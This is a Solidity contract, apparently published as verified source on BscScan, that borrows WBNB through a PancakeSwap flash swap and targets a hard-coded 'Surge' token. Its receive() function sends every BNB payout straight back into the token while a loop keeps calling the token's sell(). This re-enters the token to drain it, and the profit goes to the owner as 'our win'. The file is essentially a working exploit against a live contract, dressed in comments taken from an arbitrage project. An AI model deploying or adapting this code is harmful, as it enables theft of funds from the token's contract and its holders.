/**
 *Submitted for verification at BscScan.com on 2021-10-21
*/

// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;
// @author Daniel Espendiller - https://github.com/Haehnchen/uniswap-arbitrage-flash-swap - espend.de
//
// e00: out of block
// e01: no profit
// e10: Requested pair is not available
// e11: token0 / token1 does not exist
// e12: src/target router empty
// e13: pancakeCall not enough tokens for buyback
// e14: pancakeCall msg.sender transfer failed
// e15: pancakeCall owner transfer failed
// e16
// pancakeFactory:0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73
// pancakeRouter:0x10ED43C718714eb63d5aA57B78B54704E256024E
// WBNB:0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c
// token0(cake):0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82
// token1(wbnb):0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c
// pancakePair:0x0eD7e52944161450477ee417DE9Cd3a859b14fD0
// Surge:0xE1E1Aa58983F6b8eE8E4eCD206ceA6578F036c21

interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function sell(uint256 tokenAmount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IPancakeFactory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IPancakePair {
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Router {
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
    function swapExactTokensForTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts);
}

interface IWBNB {
    function deposit() external payable ;
    function transfer(address dst, uint wad) external returns (bool) ;
    function withdraw(uint wad) external ;
    function balanceOf(address account) external view returns (uint256);
}

contract PancakeFlashSwap {
    address public owner;
    bool public sell = true;

    constructor() {
        owner = msg.sender;
    }

    function start(
        address _cake, // example BUSD
        address _wbnb,
        uint256 amount, // example: BNB => 10 * 1e18
        uint256 _cyclic
    ) external {
        address pairAddress = IPancakeFactory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73).getPair(_cake, _wbnb);
        require(pairAddress != address(0), 'e10');
        address token0 = IPancakePair(pairAddress).token0();
        address token1 = IPancakePair(pairAddress).token1();
        require(token0 != address(0) && token1 != address(0), 'e11');

        IPancakePair(pairAddress).swap(
            _wbnb == token0 ? amount : 0,
            _wbnb == token1 ? amount : 0,
            address(this),
            abi.encode(_cyclic)
        );
    }

    // pancake, pancakeV2, apeswap, kebab
    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external {
        execute(sender, amount0, amount1, data);
    }

    function execute(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) internal {
        uint256 cyclic = abi.decode(_data, (uint256));
        // obtain an amount of token that you exchanged
        uint256 amountToken = _amount0 == 0 ? _amount1 : _amount0;
        uint256 fee = (amountToken * 25 / 10000);
        uint256 finalFee = amountToken + fee;
        IWBNB wbnb = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
        wbnb.withdraw(amountToken);

        IERC20 surge = IERC20(0xE1E1Aa58983F6b8eE8E4eCD206ceA6578F036c21);
        payable(0xE1E1Aa58983F6b8eE8E4eCD206ceA6578F036c21).call{value: amountToken, gas: 1000000}("");
        for(uint i = 1; i <= cyclic; i++){
            if(i == 9){
                sell = false;
            }
            surge.sell(surge.balanceOf(address(this)));
        }
        uint bnb = address(this).balance;
        payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c).call{value: bnb, gas: 1000000}("");

        IERC20 rbnb = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
        rbnb.transfer(msg.sender, finalFee); // send back borrow
        rbnb.transfer(owner, bnb - finalFee); // our win
    }

    receive() external payable {
        if(sell){
            uint256 bnb = msg.value;
            payable(0xE1E1Aa58983F6b8eE8E4eCD206ceA6578F036c21).call{value: bnb, gas: 40000}("");
        }

    }
}